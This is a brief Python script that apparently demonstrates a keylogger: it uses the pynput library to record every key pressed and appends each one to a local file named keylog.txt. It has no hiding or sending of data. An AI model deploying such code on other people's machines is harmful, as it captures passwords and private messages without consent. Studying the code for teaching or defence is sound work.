import logging
import pynput.keyboard

def on_press(key):
    """Log a message when a key is pressed."""
    try:
        log_message = f"{key.char}"
    except AttributeError:
        log_message = f"{key}"

    with open("keylog.txt", "a") as f:
        f.write(log_message + "\n")

def main():
    """Start the listener."""
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
